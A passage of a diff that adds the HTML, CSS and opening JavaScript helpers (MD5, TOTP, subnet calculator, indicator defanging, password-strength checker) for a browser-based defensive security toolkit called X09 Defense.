@@ -1,0 +1,981 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<link rel="icon" href="/x09/logo-defense.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="/x09/icon-512.png">
+<title>X09 Defense</title>
+<meta name="description" content="X09 Defense — a browser-based cyber defense toolkit. Everything runs locally.">
+<link rel="stylesheet" href="/x09/x09-fonts.css">
+<style>
+/* Layout: X09 Terminal system (shared with Hub, AI, Docs) — floating black title bar, bordered tool dock on the left, square black boxes with white rules over the X09 Space physics layer. */
+:root{
+  --bg:#000; --ink:#f5f5f5; --fg:#f5f5f5; --muted:#a3a3a3; --dim:#6a6a6a;
+  --hair:rgba(255,255,255,.16); --hair-2:rgba(255,255,255,.32); --line:rgba(255,255,255,.16); --line-2:rgba(255,255,255,.32);
+  --glass:rgba(0,0,0,.78); --glass-2:rgba(0,0,0,.9); --panel:rgba(0,0,0,.78); --panel-2:#0b0b0b;
+  --accent:#fff; --on-accent:#000;
+  --crit:#ffffff; --high:#e8e8e8; --med:#bdbdbd; --low:#8f8f8f; --ok:#ffffff;
+  --mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace; --display:var(--mono);
+  color-scheme:dark;
+}
+*{border-radius:0!important}
+html,body{height:100%;background:#000}
+body{background:#000;color:var(--ink);font:15px/1.55 var(--mono);-webkit-font-smoothing:antialiased}
+body::after{content:"";position:fixed;inset:0;z-index:95;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(255,255,255,.028) 0 1px,transparent 1px 3px),radial-gradient(120% 90% at 50% 50%,transparent 60%,rgba(0,0,0,.55) 100%)}
+#x09-space{position:fixed;inset:0;width:100%;height:100%;z-index:0;pointer-events:none}
+html.x09-grabbing,html.x09-grabbing *{cursor:grabbing!important;user-select:none!important}
+::selection{background:#fff;color:#000}
+a{color:inherit}
+:focus-visible{outline:1px solid #fff;outline-offset:2px}
+@keyframes x09blink{50%{opacity:0}}
+.x09-cursor::after{content:"";display:inline-block;width:.5em;height:.95em;margin-left:.12em;vertical-align:-.12em;background:#fff;animation:x09blink 1.05s steps(1) infinite}
+
+.app{position:relative;z-index:1;display:grid;grid-template-columns:268px minmax(0,1fr);grid-template-rows:auto 1fr;min-height:100%}
+
+/* title bar */
+.topbar{grid-column:1/-1;position:sticky;top:env(safe-area-inset-top,0px);z-index:30;margin:12px 14px 0;height:58px;padding:0 10px 0 16px;display:flex;align-items:center;gap:12px;background:#000;border:1px solid var(--hair-2)}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;flex:none}
+.x09-wordmark{font:800 1rem var(--mono);letter-spacing:-.02em;white-space:nowrap}
+.x09-wordmark small{font:500 .95rem var(--mono);color:var(--muted)}
+.x09-wordmark small::before{content:"\";margin-right:.05em}
+.prompt{min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--dim);font-size:.82rem;padding-left:14px;border-left:1px solid var(--hair)}
+.prompt b{color:#d0d0d0;font-weight:600}
+.hud{margin-left:auto;display:flex;align-items:center;gap:8px;flex:none}
+.hud-clock{font:500 .75rem var(--mono);letter-spacing:.04em;color:var(--muted)}
+.local{display:flex;align-items:center;gap:7px;font-size:.7rem;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);border:1px solid var(--hair);padding:4px 9px}
+.local i{width:6px;height:6px;background:#fff;box-shadow:0 0 8px #fff;animation:x09blink 2.2s steps(1) infinite}
+.x09-switch{position:relative}
+.x09-switch-btn{width:38px;height:38px;display:grid;place-items:center;border:1px solid var(--hair-2);background:#000;color:var(--ink);cursor:pointer}
+.x09-switch-btn:hover,.x09-switch-btn[aria-expanded="true"]{border-color:#fff}
+.x09-switch-menu{position:absolute;right:0;top:calc(100% + 12px);z-index:70;width:330px;background:#000;border:1px solid #fff;box-shadow:0 0 0 4px #000,0 0 0 5px var(--hair);padding:8px}
+.x09-switch-head{padding:8px 10px 10px;font-size:.8rem;color:var(--muted)}
+.x09-switch-item{display:flex;align-items:center;gap:12px;padding:10px;color:var(--ink);text-decoration:none}
+.x09-switch-item:hover{background:#0c0c0c}
+.x09-switch-item.here{background:#111;outline:1px solid var(--hair-2)}
+.x09-switch-orb{width:38px;height:38px;flex-shrink:0;display:grid;place-items:center;border:1px solid rgba(255,255,255,.45);font:800 .62rem var(--mono)}
+.x09-switch-item b{display:block;font-weight:700;font-size:.92rem}
+.x09-switch-item span span{display:block;font-size:.76rem;color:var(--muted)}
+.x09-chip{margin-left:auto;padding:3px 8px;border:1px solid var(--hair-2);font:700 .62rem var(--mono);letter-spacing:.06em;text-transform:uppercase;color:var(--muted)}
+.x09-chip.on{background:#fff;color:#000;border-color:#fff}
+.menu-btn{display:none}
+
+/* dock */
+.rail{position:sticky;top:calc(82px + env(safe-area-inset-top,0px));align-self:start;max-height:calc(100vh - 96px);overflow:auto;margin:12px 0 12px 14px;background:#000;border:1px solid var(--hair-2);display:flex;flex-direction:column;padding:14px 0 12px}
+.rail-logo{display:flex;align-items:center;gap:10px;padding:0 16px 12px;border-bottom:1px solid var(--hair)}
+.rail-logo b{font-weight:800;font-size:.85rem}
+.rail-logo span{display:block;font-size:.7rem;color:var(--dim)}
+.search{margin:12px 12px 4px;position:relative}
+.search input{width:100%;box-sizing:border-box;background:#000;border:1px solid var(--hair-2);color:var(--ink);font:.8rem var(--mono);padding:8px 30px 8px 24px}
+.search input:focus{border-color:#fff;outline:0}
+.search::before{content:">";position:absolute;left:10px;top:7px;color:#fff;font-weight:800}
+.search kbd{position:absolute;right:8px;top:7px;font:.7rem var(--mono);color:var(--dim);border:1px solid var(--hair-2);padding:0 5px}
+nav{display:flex;flex-direction:column;gap:12px;padding:10px 8px 14px;flex:1}
+.grp h4{margin:0 10px 4px;font:500 .72rem var(--mono);color:var(--dim)}
+.grp h4::before{content:"# "}
+.nav-a{display:flex;align-items:center;gap:10px;padding:6px 10px;text-decoration:none;color:var(--muted);font-size:.8rem}
+.nav-a:hover{color:#fff;background:#0c0c0c}
+.nav-a[aria-current="page"]{color:#000;background:#fff;font-weight:700}
+.nav-a .gl{width:14px;text-align:center}
+.rail-foot{padding:10px 16px 0;border-top:1px solid var(--hair);font-size:.68rem;color:var(--dim);display:flex;flex-direction:column;gap:3px}
+
+/* main */
+main{min-width:0;padding-inline:clamp(16px,3vw,40px);padding-block:10px 70px}
+.vhead{padding-block:22px 24px;max-width:900px}
+.kicker{margin:0;color:var(--muted);font-size:.82rem;letter-spacing:.04em}
+.kicker::before{content:"$ ";color:#fff;font-weight:700}
+h1{font:800 clamp(1.7rem,3.8vw,2.7rem)/1.05 var(--mono);letter-spacing:-.04em;color:#fff;text-shadow:0 0 18px rgba(255,255,255,.28);margin:10px 0 10px;text-wrap:balance}
+h1::before{content:"> ";color:var(--dim)}
+.lede{margin:0;color:var(--muted);max-width:70ch}
+h2{font:800 1.05rem var(--mono);letter-spacing:-.02em;margin:0 0 12px}
+h3{font:600 .72rem var(--mono);letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin:0 0 10px}
+h3::before{content:"// ";color:var(--dim)}
+p{margin:0}
+.muted{color:var(--muted)}
+.small{font-size:.78rem}
+
+.card{background:var(--glass);border:1px solid var(--hair-2);padding:18px;min-width:0}
+.stack{display:flex;flex-direction:column;gap:16px;min-width:0}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.grow{flex:1 1 240px;min-width:0}
+.io{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px;align-items:start}
+.g3{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:12px}
+@media (max-width:1100px){.io{grid-template-columns:minmax(0,1fr)}}
+
+.lbl{display:block;font-size:.78rem;color:var(--muted);margin-bottom:6px}
+.inp,textarea,select{width:100%;box-sizing:border-box;background:#000;border:1px solid var(--hair-2);color:var(--ink);font:.84rem/1.55 var(--mono);padding:10px 12px;caret-color:#fff}
+.inp:focus,textarea:focus,select:focus{border-color:#fff;outline:0;box-shadow:0 0 0 1px #fff,0 0 30px rgba(255,255,255,.08)}
+textarea{min-height:170px;resize:vertical}
+.row .inp{width:auto}
+input[type=checkbox]{accent-color:#fff;width:15px;height:15px}
+input[type=range]{accent-color:#fff;width:100%}
+.check{display:flex;align-items:center;gap:8px;font-size:.82rem;cursor:pointer}
+
+.btn{font:700 .78rem var(--mono);letter-spacing:.08em;text-transform:uppercase;padding:10px 16px;border:1px solid #fff;background:#fff;color:#000;cursor:pointer;white-space:nowrap}
+.btn::before{content:"[ ";opacity:.6}.btn::after{content:" ]";opacity:.6}
+.btn:hover{background:#000;color:#fff}
+.btn.ghost{background:#000;color:#fff;border-color:var(--hair-2)}
+.btn.ghost:hover{background:#fff;color:#000;border-color:#fff}
+.btn.sm{padding:6px 10px;font-size:.7rem}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chip{font:500 .76rem var(--mono);color:var(--muted);background:#000;border:1px dashed var(--hair-2);padding:6px 12px;cursor:pointer;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.chip:hover{border-style:solid;border-color:#fff;color:#fff}
+.tabs{display:inline-flex;align-self:flex-start;padding:2px;gap:2px;border:1px solid var(--hair-2);background:#000;flex-wrap:wrap}
+.tab{font:600 .72rem var(--mono);letter-spacing:.06em;text-transform:uppercase;background:none;border:0;color:var(--muted);padding:7px 14px;cursor:pointer}
+.tab[aria-selected="true"]{background:#fff;color:#000}
+
+pre,.out{background:#0b0b0b;border:1px solid var(--hair-2);padding:12px 14px;margin:0;font:.8rem/1.6 var(--mono);white-space:pre-wrap;word-break:break-all;overflow:auto;max-height:520px;color:var(--ink)}
+code{font-family:var(--mono);font-size:.95em;background:#0b0b0b;border:1px solid var(--hair);padding:1px 5px;word-break:break-all}
+.kv{display:grid;grid-template-columns:minmax(110px,max-content) minmax(0,1fr);gap:7px 18px;font-size:.82rem}
+.kv dt{color:var(--dim)}.kv dt::after{content:":"}
+.kv dd{margin:0;word-break:break-all;font-variant-numeric:tabular-nums}
+.tbl-wrap{overflow-x:auto;border:1px solid var(--hair-2);background:var(--glass)}
+table{border-collapse:collapse;width:100%;font-size:.8rem;font-variant-numeric:tabular-nums}
+th,td{text-align:left;padding:8px 12px;border-bottom:1px solid var(--hair);vertical-align:top}
+th{font-weight:600;color:var(--muted);font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;background:#0b0b0b;white-space:nowrap}
+tr:last-child td{border-bottom:0}
+
+/* severity: monochrome, encoded by weight, fill and line style */
+.s-crit{color:#fff;text-shadow:0 0 14px rgba(255,255,255,.45)}.s-high{color:#fff}.s-med{color:#d0d0d0}.s-low{color:var(--muted)}.s-info{color:var(--dim)}.s-ok{color:#fff}
+.sev{display:inline-block;font:700 .62rem var(--mono);letter-spacing:.1em;padding:2px 6px;border:1px solid currentColor;white-space:nowrap;text-shadow:none}
+.sev.s-crit{background:#fff;color:#000;border-color:#fff}
+.sev.s-high{border-width:2px;padding:1px 5px}
+.sev.s-med{border-style:dashed}
+.sev.s-low{border-style:dotted}
+.sev.s-ok{color:var(--muted);border-color:var(--hair-2)}
+.findings{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:8px}
+.f{display:grid;grid-template-columns:70px minmax(0,1fr);gap:12px;align-items:start;padding:10px 12px;border:1px solid var(--hair);background:var(--glass);text-shadow:none}
+.f.s-crit{border:1px solid #fff;border-left:5px solid #fff;background:rgba(255,255,255,.05)}
+.f.s-high{border-left:3px solid #fff}
+.f.s-med{border-left:2px dashed #bdbdbd}
+.f.s-low{border-left:1px dotted #8f8f8f}
+.f>div{color:var(--ink)}
+.f b{font-weight:700}
+.f p{color:var(--muted);font-size:.78rem;margin-top:3px}
+.verdict{display:flex;gap:20px;align-items:center;flex-wrap:wrap;padding:16px 18px;border:1px solid #fff;background:#000;box-shadow:4px 4px 0 rgba(255,255,255,.3)}
+.verdict .big{font:800 2.8rem/1 var(--mono);letter-spacing:-.04em;min-width:64px;color:#fff;text-shadow:0 0 18px rgba(255,255,255,.35)}
+.verdict .vt{font:800 1.15rem var(--mono);letter-spacing:-.02em;text-transform:uppercase}
+.verdict .vt.s-crit::after{content:"";display:inline-block;width:.5em;height:.9em;margin-left:.2em;vertical-align:-.1em;background:#fff;animation:x09blink 1.05s steps(1) infinite}
+.vt{font-weight:800}
+.counts{display:flex;gap:8px;flex-wrap:wrap}
+.meter{display:grid;grid-template-columns:repeat(5,1fr);gap:4px;width:100%}
+.meter span{height:8px;background:#111;border:1px solid var(--hair)}
+.bar{height:8px;background:#111;border:1px solid var(--hair);overflow:hidden}
+.bar>i{display:block;height:100%;background:repeating-linear-gradient(90deg,#fff 0 6px,transparent 6px 8px);transition:width .9s linear}
+.banner{padding:12px 16px;border:1px solid currentColor;font-weight:700;font-size:.85rem;background:#000;text-shadow:none}
+.banner.s-crit{background:#fff;color:#000;border-color:#fff}
+.banner.s-crit::before{content:"✗ "}
+.banner.s-ok::before{content:"✓ "}
+.banner.s-med{border-style:dashed}.banner.s-med::before{content:"! "}
+.drop{border:1px dashed var(--hair-2);padding:34px 16px;text-align:center;color:var(--muted);cursor:pointer;background:var(--glass)}
+.drop.over{border-style:solid;border-color:#fff;color:#fff}
+.big-code{font:800 clamp(2.4rem,8vw,3.8rem) var(--mono);letter-spacing:.12em;font-variant-numeric:tabular-nums;color:#fff;text-shadow:0 0 22px rgba(255,255,255,.35)}
+
+/* console */
+.tool-card{display:flex;flex-direction:column;gap:6px;text-decoration:none;padding:14px 16px;border:1px solid var(--hair-2);background:var(--glass);will-change:transform}
+.tool-card:hover{border-color:#fff;background:#0c0c0c}
+.tool-card b{font-weight:800;font-size:.92rem;letter-spacing:-.02em}
+.tool-card b::before{content:"./";color:var(--dim);font-weight:500}
+.tool-card span{font-size:.76rem;color:var(--muted)}
+.tool-card .gl{font-size:.85rem;color:#fff}
+.stat{display:flex;gap:30px;flex-wrap:wrap;font-size:.76rem;color:var(--muted)}
+.stat b{display:block;font:800 1.6rem var(--mono);letter-spacing:-.04em;color:#fff;text-shadow:0 0 14px rgba(255,255,255,.25)}
+.console-box{position:relative;background:#000;border:1px solid var(--hair-2);padding:16px 16px 14px 42px}
+.console-box::before{content:">";position:absolute;left:18px;top:16px;font:800 1.1rem var(--mono);color:#fff;text-shadow:0 0 10px rgba(255,255,255,.5)}
+.console-box:focus-within{border-color:#fff;box-shadow:0 0 0 1px #fff,0 0 40px rgba(255,255,255,.12)}
+.console-box textarea{border:0;background:transparent;padding:0;min-height:96px;font-size:.95rem;box-shadow:none!important}
+.pb-phase{border-top:1px solid var(--hair);padding-top:14px}
+.pb-item{display:flex;gap:10px;align-items:flex-start;padding:5px 0;font-size:.82rem;cursor:pointer}
+.pb-item input{margin-top:3px;flex:none}
+.pb-item.done span{color:var(--dim);text-decoration:line-through}
+
+@media (max-width:880px){
+  .app{grid-template-columns:minmax(0,1fr)}
+  .topbar{margin:10px 10px 0;height:54px;padding:0 6px 0 10px;gap:8px}
+  .prompt,.local,.hud-clock{display:none}
+  .menu-btn{display:grid}
+  .rail{position:fixed;left:0;top:0;bottom:0;margin:0;max-height:none;width:min(300px,86vw);z-index:60;transform:translateX(-102%);transition:transform .22s ease;padding-top:calc(14px + env(safe-area-inset-top,0px))}
+  .rail.open{transform:none}
+  .scrim{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:55}
+  .x09-switch-menu{position:fixed;top:70px;right:10px;width:min(330px,calc(100vw - 20px))}
+  .f{grid-template-columns:minmax(0,1fr);gap:6px}
+  .f .sev{justify-self:start}
+}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+
+</head>
+<body>
+<div class="app">
+  <header class="topbar">
+    <button class="x09-switch-btn menu-btn" id="menu" aria-label="Open tool list"><svg viewBox="0 0 24 24" width="18" height="18"><path d="M4 7h16M4 12h16M4 17h16" stroke="currentColor" stroke-width="1.8"/></svg></button>
+    <a class="brand" href="#console" aria-label="X09 Defense home"><span id="topLogo"></span><span class="x09-wordmark x09-cursor">X09<small>DEFENSE</small></span></a>
+    <div class="prompt">x09@defense:~$ <b id="cmd">console</b></div>
+    <div class="hud">
+      <span class="hud-clock" id="clock"></span>
+      <span class="local" title="All analysis runs in your browser"><i></i>on-device</span>
+      <div class="x09-switch">
+        <button class="x09-switch-btn" id="swBtn" aria-haspopup="true" aria-expanded="false" aria-label="X09 apps"><svg viewBox="0 0 24 24" width="17" height="17"><path d="M4 4h6v6H4zM14 4h6v6h-6zM4 14h6v6H4zM14 14h6v6h-6z" stroke="currentColor" stroke-width="1.6" fill="none"/></svg></button>
+        <div class="x09-switch-menu" id="swMenu" role="menu" hidden>
+          <div class="x09-switch-head">X09 apps · one account</div>
+          <a class="x09-switch-item" href="/"><span class="x09-switch-orb">HUB</span><span><b>X09 Hub</b><span>Start here · Ask X09</span></span></a>
+          <a class="x09-switch-item" href="https://ai.x09hub.com"><span class="x09-switch-orb">AI</span><span><b>X09 AI</b><span>Chat with Claude</span></span></a>
+          <a class="x09-switch-item" href="https://docs.x09hub.com"><span class="x09-switch-orb">DOC</span><span><b>X09 Docs</b><span>Invoices, estimates, contracts</span></span></a>
+          <a class="x09-switch-item here" href="#console"><span class="x09-switch-orb">DEF</span><span><b>X09 Defense</b><span>Cyber defense toolkit</span></span><span class="x09-chip on">Here</span></a>
+        </div>
+      </div>
+    </div>
+  </header>
+  <aside class="rail" id="rail" aria-label="Tools">
+    <a class="rail-logo" href="#console">
+      <img src="/x09/logo-defense.svg" width="34" height="34" alt="">
+      <span><b>Defense toolkit</b><span id="toolCount"></span></span>
+    </a>
+    <div class="search"><input id="q" type="search" placeholder="find a tool" autocomplete="off" aria-label="Find a tool"><kbd>/</kbd></div>
+    <nav id="nav"></nav>
+    <div class="rail-foot"><span>local mode: nothing is uploaded</span><span>x09 defense v1.1</span></div>
+  </aside>
+  <div class="scrim" id="scrim" hidden></div>
+  <main data-x09-bg>
+    <div id="view" data-x09-bg></div>
+  </main>
+</div>
+
+<script id="core">
+/* ===== Pure helpers (no DOM) ===== */
+const enc=new TextEncoder(), dec=new TextDecoder();
+const toHex=b=>[...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('');
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
+function bytesToB64(u8){let s='';for(let i=0;i<u8.length;i+=0x8000)s+=String.fromCharCode.apply(null,u8.subarray(i,i+0x8000));return btoa(s)}
+function b64ToBytes(b){const s=atob(b);const u=new Uint8Array(s.length);for(let i=0;i<s.length;i++)u[i]=s.charCodeAt(i);return u}
+const b64url=u8=>bytesToB64(u8).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+function b64urlToBytes(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return b64ToBytes(s)}
+async function sha(alg,data){return toHex(await crypto.subtle.digest(alg,data))}
+function rint(n){const lim=Math.floor(0x100000000/n)*n,a=new Uint32Array(1);do crypto.getRandomValues(a);while(a[0]>=lim);return a[0]%n}
+
+function md5(bytes){
+  const K=new Uint32Array(64),S=[7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
+  for(let i=0;i<64;i++)K[i]=Math.floor(Math.abs(Math.sin(i+1))*4294967296)>>>0;
+  const len=bytes.length,nb=((len+8)>>>6)+1,w=new Uint32Array(nb*16);
+  for(let i=0;i<len;i++)w[i>>2]|=bytes[i]<<((i%4)*8);
+  w[len>>2]|=0x80<<((len%4)*8);
+  w[nb*16-2]=(len*8)>>>0;w[nb*16-1]=Math.floor(len/0x20000000);
+  let a0=0x67452301,b0=0xefcdab89,c0=0x98badcfe,d0=0x10325476;
+  for(let o=0;o<w.length;o+=16){
+    let A=a0,B=b0,C=c0,D=d0;
+    for(let i=0;i<64;i++){
+      let F,g;
+      if(i<16){F=(B&C)|(~B&D);g=i}else if(i<32){F=(D&B)|(~D&C);g=(5*i+1)%16}
+      else if(i<48){F=B^C^D;g=(3*i+5)%16}else{F=C^(B|~D);g=(7*i)%16}
+      F=(F+A+K[i]+w[o+g])>>>0;A=D;D=C;C=B;B=(B+((F<<S[i])|(F>>>(32-S[i]))))>>>0;
+    }
+    a0=(a0+A)>>>0;b0=(b0+B)>>>0;c0=(c0+C)>>>0;d0=(d0+D)>>>0;
+  }
+  return [a0,b0,c0,d0].map(x=>[0,8,16,24].map(s=>((x>>>s)&255).toString(16).padStart(2,'0')).join('')).join('');
+}
+
+/* ---- base32 + TOTP (RFC 6238) ---- */
+const B32='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+function b32dec(s){s=s.toUpperCase().replace(/[\s=-]/g,'');let bits=0,val=0;const out=[];
+  for(const c of s){const i=B32.indexOf(c);if(i<0)throw Error('"'+c+'" is not a valid Base32 character (A–Z, 2–7).');val=(val<<5)|i;bits+=5;if(bits>=8){out.push((val>>>(bits-8))&255);bits-=8;val&=(1<<bits)-1}}
+  return new Uint8Array(out)}
+function b32enc(u8){let bits=0,val=0,out='';for(const b of u8){val=(val<<8)|b;bits+=8;while(bits>=5){out+=B32[(val>>>(bits-5))&31];bits-=5;val&=(1<<bits)-1}}if(bits>0)out+=B32[(val<<(5-bits))&31];return out}
+async function hotp(keyBytes,counter,digits=6){
+  const buf=new ArrayBuffer(8),dv=new DataView(buf);dv.setUint32(0,Math.floor(counter/4294967296));dv.setUint32(4,counter>>>0);
+  const key=await crypto.subtle.importKey('raw',keyBytes,{name:'HMAC',hash:'SHA-1'},false,['sign']);
+  const h=new Uint8Array(await crypto.subtle.sign('HMAC',key,buf));const o=h[h.length-1]&15;
+  const bin=((h[o]&127)<<24)|(h[o+1]<<16)|(h[o+2]<<8)|h[o+3];
+  return String(bin%10**digits).padStart(digits,'0');
+}
+
+/* ---- domains ---- */
+const MULTI_SUFFIX=['co.uk','org.uk','ac.uk','gov.uk','com.au','net.au','co.jp','co.nz','com.br','co.in','com.mx','co.za','com.tr','com.sg'];
+function regDomain(host){host=(host||'').toLowerCase().replace(/\.$/,'');const p=host.split('.');if(p.length<=2)return host;const l2=p.slice(-2).join('.');return MULTI_SUFFIX.includes(l2)?p.slice(-3).join('.'):l2}
+function lev(a,b){const m=a.length,n=b.length;if(Math.abs(m-n)>2)return 9;let prev=Array.from({length:n+1},(_,i)=>i);for(let i=1;i<=m;i++){const cur=[i];for(let j=1;j<=n;j++)cur[j]=Math.min(prev[j]+1,cur[j-1]+1,prev[j-1]+(a[i-1]===b[j-1]?0:1));prev=cur}return prev[n]}
+function refang(t){return t.replace(/h[xX]{2}p(s?)/g,'http$1').replace(/\[\.\]|\(\.\)|\{\.\}|\[dot\]|\(dot\)/gi,'.').replace(/\[:\]/g,':').replace(/\[@\]|\[at\]/gi,'@').replace(/\[\/\]/g,'/')}
+function defang(s){return s.replace(/^http/i,m=>m[0]+'xx'+m.slice(3)).replace(/\./g,'[.]')}
+
+/* ---- IPv4 ---- */
+function ipToInt(s){const p=String(s).trim().split('.');if(p.length!==4)return null;let n=0;for(const x of p){if(!/^\d{1,3}$/.test(x)||+x>255)return null;n=n*256+ +x}return n>>>0}
+const intToIp=n=>[n>>>24,(n>>>16)&255,(n>>>8)&255,n&255].join('.');
+const maskOf=p=>p===0?0:(0xffffffff<<(32-p))>>>0;
+function prefixOf(m){let p=0,z=false;for(let i=31;i>=0;i--){if((m>>>i)&1){if(z)return null;p++}else z=true}return p}
+function ipScope(n){const inR=(b,p)=>((n&maskOf(p))>>>0)===ipToInt(b);
+  if(inR('10.0.0.0',8)||inR('172.16.0.0',12)||inR('192.168.0.0',16))return'Private (RFC 1918)';
+  if(inR('127.0.0.0',8))return'Loopback';if(inR('169.254.0.0',16))return'Link-local';if(inR('100.64.0.0',10))return'Carrier-grade NAT';
+  if(inR('224.0.0.0',4))return'Multicast';if(inR('0.0.0.0',8))return'"This network"';if(inR('240.0.0.0',4))return'Reserved';
+  if(inR('192.0.2.0',24)||inR('198.51.100.0',24)||inR('203.0.113.0',24))return'Documentation (TEST-NET)';return'Public'}
+function subnet(input){
+  const m=String(input).trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\s*(?:\/\s*(\d{1,2})|\s+(\d{1,3}(?:\.\d{1,3}){3}))?$/);
+  if(!m)throw Error('Enter an IPv4 address with a prefix, like 10.20.4.17/22, or a mask, like 10.20.4.17 255.255.252.0.');
+  const ip=ipToInt(m[1]);if(ip===null)throw Error('That IP address has an octet above 255.');
+  let p=m[2]!==undefined?+m[2]:m[3]?prefixOf(ipToInt(m[3])??-1):32;
+  if(m[3]&&(ipToInt(m[3])===null||p===null))throw Error('That subnet mask is not valid. Masks must be contiguous ones, like 255.255.255.0.');
+  if(p>32)throw Error('Prefix length must be between 0 and 32.');
+  const mask=maskOf(p),net=(ip&mask)>>>0,bc=(net|(~mask>>>0))>>>0,size=2**(32-p);
+  const hosts=p===32?1:p===31?2:size-2,first=p>=31?net:net+1,last=p>=31?bc:bc-1;
+  const o1=ip>>>24,cls=o1<128?'A':o1<192?'B':o1<224?'C':o1<240?'D (multicast)':'E (reserved)';
+  return {ip:intToIp(ip),prefix:p,mask:intToIp(mask),wildcard:intToIp((~mask)>>>0),network:intToIp(net),broadcast:intToIp(bc),first:intToIp(first),last:intToIp(last),hosts,size,cls,scope:ipScope(ip),
+    bin:[ip,mask].map(n=>n.toString(2).padStart(32,'0').match(/.{8}/g).join('.')),netInt:net,bcInt:bc};
+}
+
+/* ---- passwords ---- */
+const COMMON=['password','123456','123456789','12345678','12345','1234567','1234567890','qwerty','abc123','football','monkey','letmein','dragon','111111','baseball','iloveyou','trustno1','sunshine','master','welcome','shadow','ashley','superman','michael','login','princess','admin','passw0rd','starwars','hello','freedom','whatever','qazwsx','password1','password123','654321','000000','qwerty123','1q2w3e4r','zaq12wsx','charlie','secret','summer','winter','123123','666666','121212','flower','hottie','loveme','jesus','ninja','mustang','access','batman','solo','p@ssw0rd','admin123','welcome1','changeme','test123'];
+const DICT=['password','admin','welcome','login','dragon','monkey','master','qwerty','letmein','sunshine','princess','football','baseball','shadow','summer','winter','spring','autumn','love','secret','hello','money','crypto','bitcoin','solana','ninja','batman','superman','iloveyou','company','office','server','root','user','guest','test','dog','cat'];
+const deLeetPw=s=>s.replace(/@|4/g,'a').replace(/3/g,'e').replace(/[1!|]/g,'i').replace(/0/g,'o').replace(/\$|5/g,'s').replace(/7/g,'t');
+function hasSeq(s){for(const q of['abcdefghijklmnopqrstuvwxyz','01234567890','qwertyuiop','asdfghjkl','zxcvbnm']){for(let i=0;i+4<=q.length;i++){const sub=q.slice(i,i+4);if(s.includes(sub)||s.includes([...sub].reverse().join('')))return true}}return false}
+function analyzePassword(pw){
+  if(!pw)return null;const f=[];const L=/[a-z]/.test(pw),U=/[A-Z]/.test(pw),D=/\d/.test(pw),S=/[^A-Za-z0-9]/.test(pw);
+  let pool=(L?26:0)+(U?26:0)+(D?10:0)+(S?33:0)+(/[^\x00-\x7f]/.test(pw)?100:0);const len=[...pw].length;
+  let bits=len*Math.log2(Math.max(pool,2));const low=pw.toLowerCase(),norm=deLeetPw(low);
+  const common=COMMON.includes(low)||COMMON.includes(norm);
+  if(common){bits=Math.min(bits,7);f.push({sev:'crit',title:'This is one of the most common passwords',detail:'Attackers try lists like this first. It would be guessed in seconds.'})}
+  const word=!common&&DICT.find(w=>norm.includes(w));
+  if(word){bits-=Math.min(20,word.length*3);f.push({sev:'high',title:`Contains the dictionary word "${word}"`,detail:'Swapping letters for look-alike symbols (@ for a, 0 for o) is one of the first rules cracking tools apply.'})}
+  if(/^[A-Z]?[a-z]+\d{1,4}[!@#$%*?.]?$/.test(pw)){bits-=10;f.push({sev:'high',title:'Predictable shape: word, then digits, then a symbol',detail:'This is the most common human password pattern, so tools try it early.'})}
+  if(/(.)\1{2,}/.test(pw)){bits-=8;f.push({sev:'med',title:'Repeated characters',detail:'Runs like "aaa" or "111" add length without adding much strength.'})}
+  if(hasSeq(low)){bits-=8;f.push({sev:'med',title:'Keyboard or alphabet sequence',detail:'Sequences like "1234", "abcd" or "qwer" are in every cracking wordlist.'})}
+  if(/(19[4-9]\d|20[0-3]\d)/.test(pw)){bits-=5;f.push({sev:'low',title:'Contains a year',detail:'Birth years and anniversaries are easy to guess from social media.'})}
+  if(len<8)f.push({sev:'crit',title:`Only ${len} characters`,detail:'Use at least 12 characters, and 16 or more for email, banking and admin accounts.'});
+  else if(len<12)f.push({sev:'med',title:`Only ${len} characters`,detail:'Length matters more than symbols. Aim for 16 or more.'});
+  if([L,U,D,S].filter(Boolean).length<3&&len<16)f.push({sev:'low',title:'Few character types',detail:'Mix upper case, lower case, digits and symbols, or use a long passphrase instead.'});
+  bits=Math.max(0,bits);const score=bits<28?0:bits<40?1:bits<60?2:bits<80?3:4;
+  if(!f.length)f.push({sev:'ok',title:'No weak patterns found',detail:'Keep it unique to one site and store it in a password manager.'});
+  return {bits,score,len,pool,f};
+}
+function fmtDur(s){if(!isFinite(s)||s>3.15e7*1e9)return'billions of years';if(s<1)return'instantly';
+  for(const[n,v]of[['century',3.156e9],['year',3.156e7],['month',2.63e6],['day',86400],['hour',3600],['minute',60],['second',1]]){if(s>=v){const x=Math.floor(s/v);if(n==='century'&&x>=1e4)return'millions of years';return x.toLocaleString('en-US')+' '+(x===1?n:n==='century'?'centuries':n+'s')}}}
+
+/* ---- hash identification ---- */
